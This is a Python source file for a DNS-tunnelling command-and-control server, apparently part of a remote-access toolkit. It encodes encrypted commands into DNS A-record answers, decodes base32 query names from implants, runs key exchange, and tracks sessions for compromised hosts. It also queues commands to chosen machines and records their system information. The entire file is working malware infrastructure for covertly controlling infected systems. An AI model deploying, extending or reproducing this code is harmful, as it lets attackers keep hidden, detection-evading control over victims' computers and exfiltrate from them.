# -*- coding: utf-8 -*-

import copy
import struct
import random
import base64
import time

import zlib
import ascii85
import hashlib

import functools
import logging

import socket

from dnslib import DNSRecord, RR, QTYPE, A, RCODE
from dnslib.server import DNSServer, DNSHandler, BaseResolver, DNSLogger

from picocmd import *
from ecpv import ECPV

from threading import Thread, RLock, Event

class Session(object):
    def __init__(self, spi, encoder, commands):
        self.spi = spi
        self._start = time.time()
        self._encoder = encoder
        self._last_access = 0
        self.system_info = None
        self.commands = commands
        self.last_nonce = None
        self.last_qname = None

    @property
    def idle(self):
        return int(time.time() - self._last_access)

    @property
    def duration(self):
        return int(time.time() - self._start)

    @property
    def encoder(self):
        self._last_access = time.time()
        return self._encoder

    def add_command(self, command):
        if not self.commands:
            self.commands = [command]
        else:
            self.commands.append(command)

    def __repr__(self):
        return '{{SESSION {:08x}{}}}'.format(
            self.spi, self.system_info or ''
        )

class DnsNoCommandServerException(Exception):
    pass

class DnsCommandServerException(Exception):
    def __init__(self, message, nonce):
        self.message = message
        self.nonce = nonce

    @property
    def error(self):
        return Error(self.message)

    def __repr__(self):
        return str(self.error)

class DnsCommandServerHandler(BaseResolver):
    def __init__(self, domain, key, recursor=None, timeout=None):
        self.sessions = {}
        self.domain = domain
        self.recursor = recursor
        self.encoder = ECPV(private_key=key)
        self.translation = dict(zip(
            ''.join([
                ''.join([chr(x) for x in xrange(ord('a'), ord('z') + 1)]),
                '-',
                ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
            ]),
            ''.join([
                ''.join([chr(x) for x in xrange(ord('A'), ord('Z') + 1)]),
                ''.join([chr(x) for x in xrange(ord('0'), ord('9') + 1)]),
                '=',
            ])))

        self.interval = 30
        self.kex = True
        self.timeout = timeout or self.interval*3
        self.commands = []
        self.lock = RLock()
        self.finished = Event()

    def cleanup(self):
        while not self.finished.is_set():
            with self.lock:
                to_remove = []
                for spi, session in self.sessions.iteritems():
                    if session.idle > self.timeout:
                        to_remove.append(spi)
                for spi in to_remove:
                    del self.sessions[spi]

            time.sleep(self.timeout)

    def locked(f):
        @functools.wraps(f)
        def wrapped(self, *args, **kwargs):
            with self.lock:
                return f(self, *args, **kwargs)
        return wrapped

    @locked
    def add_command(self, command, session=None, default=False):
        if session:
            if type(session) in (str, unicode):
                session = int(session, 16)

        if default:
            self.commands.append(command)

        if session:
            sessions = self.find_sessions(spi=session) or \
              self.find_sessions(node=session)

            if not sessions:
                return 0

            count = 0
            if type(sessions) in (list, tuple):
                for session in sessions:
                    session.add_command(command)
                    count += 1
            else:
                count = 1
                sessions.add_command(command)

            return count
        else:
            count = 0
            for session in self.find_sessions():
                session.add_command(command)
                count += 1

            return count

    @locked
    def reset_commands(self, session=None, default=False):
        if session:
            if type(session) in (str, unicode):
                session = int(session, 16)

        if default:
            self.commands = []

        if session:
            sessions = self.find_sessions(spi=session) or \
              self.find_sessions(node=session)

            if not sessions:
                return 0

            count = 0
            if type(sessions) in (list, tuple):
                for session in sessions:
                    session.commands = []
                    count += 1
            else:
                count = 1
                sessions.commands = []

            return count
        else:
            count = 0
            for session in self.find_sessions():
                if session.commands:
                    session.commands = []
                    count += 1
            return count

    @locked
    def find_sessions(self, spi=None, node=None):
        if not (spi or node):
            return [
                session for session in self.sessions.itervalues() \
                if session.system_info is not None
            ]
        elif spi:
            return self.sessions.get(spi)
        elif node:
            return [
                session for session in self.sessions.itervalues() \
                    if session.system_info and \
                        session.system_info['node'] == node
            ]

    @locked
    def set_policy(self, kex=True, timeout=None, interval=None):
        if kex == self.kex and self.timeout == timeout and self.interval == self.interval:
            return

        if interval and interval < 30:
            raise ValueError('Interval should not be less then 30s to avoid DNS storm')

        self.interval = interval or self.interval
        self.timeout = max(timeout if timeout else self.timeout, self.interval*3)
        self.kex = kex if ( kex is not None ) else self.kex

        cmd = Policy(self.interval, self.kex)
        return self.add_command(cmd)

    @locked
    def encode_pastelink_content(self, content):
        h = hashlib.sha1()
        h.update(content)

        content = h.digest() + content
        content = zlib.compress(content, 9)
        content = self.encoder.pack(content)
        content = ascii85.ascii85EncodeDG(content)

        return content

    def on_connect(self, info):
        pass

    def on_keep_alive(self, info):
        pass

    def on_exit(self, info):
        pass

    def _a_page_encoder(self, data, encoder, nonce):
        data = encoder.encode(data, nonce, symmetric=encoder.kex_completed)

        length = struct.pack('B', len(data))
        payload = length + data

        if len(payload) > 48:
            raise ValueError('Page size more than 45 bytes ({})'.format(len(payload)))

        response = []

        for idx, part in enumerate([payload[i:i+3] for i in xrange(0, len(payload), 3)]):
            header = (random.randint(1, 6) << 29)
            idx = idx << 25
            bits = ( struct.unpack('>I', '\x00'+part+chr(random.randrange(0, 255))*(3-len(part)))[0] ) << 1
            packed = struct.unpack('!BBBB', struct.pack('>I', header | idx | bits | int(not bool(bits & 6))))
            address = '.'.join(['{}'.format(int(x)) for x in packed])
            response.append(RR('.', QTYPE.A, rdata=A(address), ttl=30))

        return response

    def _q_page_decoder(self, data):
        parts = [
            base64.b32decode(''.join([
                self.translation[x] for x in part
            ])) for part in data.stripSuffix(self.domain).idna()[:-1].split('.')
        ]

        if len(parts) == 2:
            nonce, data = parts
            nonce = struct.unpack('>I', nonce)[0]
            encoder = self.encoder
            session = None
        elif len(parts) == 3:
            spi, nonce, data = parts
            spi = struct.unpack('>I', spi)[0]
            nonce = struct.unpack('>I', nonce)[0]
            session = None
            with self.lock:
                if not spi in self.sessions:
                    raise DnsCommandServerException('NO_SESSION', nonce)
                session = self.sessions[spi]
            encoder = session.encoder
        else:
            raise DnsNoCommandServerException()

        return encoder.decode(data, nonce, symmetric=True), session, nonce


    def _cmd_processor(self, command, session):
        logging.debug('dnscnc:command={} session={}'.format(command, session))

        if isinstance(command, Poll) and session is None:
            return [Policy(self.interval, self.kex), Poll()]

        elif isinstance(command, Ack) and (session is None):
            return [Ack()]

        elif isinstance(command, Exit):
            if session and session.system_info:
                self.on_exit(session.system_info)

            with self.lock:
                del self.sessions[session.spi]

            return [Exit()]

        elif isinstance(command, Poll) and (session is not None):
            self.on_keep_alive(session.system_info)
            commands = session.commands
            return commands

        elif isinstance(command, Ack) and (session is not None):
            self.on_keep_alive(session.system_info)
            if command.amount > len(session.commands):
                logging.info('ACK: invalid amount of commands: {} > {}'.format(
                    command.amount, len(session.commands)))
            session.commands = session.commands[command.amount:]
            return [Ack()]

        elif isinstance(command, SystemInfo) and session is not None:
            session.system_info = command.get_dict()
            return [Ack()]

        elif isinstance(command, Kex):
            with self.lock:
                response = []

                if not command.spi in self.sessions:
                    self.sessions[command.spi] = Session(
                        command.spi,
                        self.encoder.clone(),
                        self.commands
                    )

                encoder = self.sessions[command.spi].encoder
                response, key = encoder.process_kex_request(command.parcel)
                logging.debug('dnscnc:kex:key={}'.format(binascii.b2a_hex(key[0])))

            return [Kex(response)]
        else:
            return [Error('NO_POLICY')]

    def resolve(self, request, handler):
        qname = request.q.qname
        reply = request.reply()

        if request.q.qtype != QTYPE.A:
            reply.header.rcode = RCODE.NXDOMAIN
            logging.debug('Request unknown qtype: {}'.format(QTYPE.get(request.q.qtype)))
            return reply

        # TODO:
        # Resolve NS?, DS, SOA somehow
        if not qname.matchSuffix(self.domain):
            if self.recursor:
                try:
                    return DNSRecord.parse(request.send(self.recursor, timeout=2))
                except socket.error:
                    pass
                except Exception as e:
                    logging.exception('DNS request forwarding failed')

            reply.header.rcode = RCODE.NXDOMAIN
            return reply

        responses = []

        session = None
        nonce = None

        try:
            request, session, nonce = self._q_page_decoder(qname)
            if session and session.last_nonce and session.last_qname:
                if nonce < session.last_nonce:
                    logging.info('Ignore nonce from past: {} < {}'.format(
                        nonce, session.last_nonce))
                    reply.header.rcode = RCODE.NXDOMAIN
                    return reply
                elif session.last_nonce == nonce and session.last_qname != qname:
                    logging.info('Last nonce but different qname: {} != {}'.format(
                        session.last_qname, qname))
                    reply.header.rcode = RCODE.NXDOMAIN
                    return reply

            for command in Parcel.unpack(request):
                for response in self._cmd_processor(command, session):
                    responses.append(response)

            if session:
                session.last_nonce = nonce
                session.last_qname = qname

        except DnsCommandServerException as e:
            nonce = e.nonce
            responses = [e.error, Policy(self.interval, self.kex), Poll()]

        except ParcelInvalidCrc as e:
            responses = [e.error]

        except DnsNoCommandServerException:
            reply.header.rcode = RCODE.NXDOMAIN
            return reply

        except TypeError:
            # Usually - invalid padding
            reply.header.rcode = RCODE.NXDOMAIN
            return reply

        except Exception as e:
            logging.exception(e)
            reply.header.rcode = RCODE.NXDOMAIN
            return reply

        encoder = session.encoder if session else self.encoder
        for rr in self._a_page_encoder(Parcel(*responses).pack(), encoder, nonce):
            a = copy.copy(rr)
            a.rname = qname
            reply.add_answer(a)

        return reply

class DnsCommandServer(Thread):
    def __init__(self, handler, port=5454, address='0.0.0.0'):
        self.handler = handler
        self.server = DNSServer(
            handler,
            address=address,
            port=port,
            logger=DNSLogger(log='log_error',prefix=False)
        )
        Thread.__init__(self)
        self.daemon = True

        self.cleaner = Thread(target=handler.cleanup)
        self.cleaner.daemon = True

    def run(self):
        self.cleaner.start()
        try:
            self.server.start()
        except:
            pass
        finally:
            self.handler.finished.set()
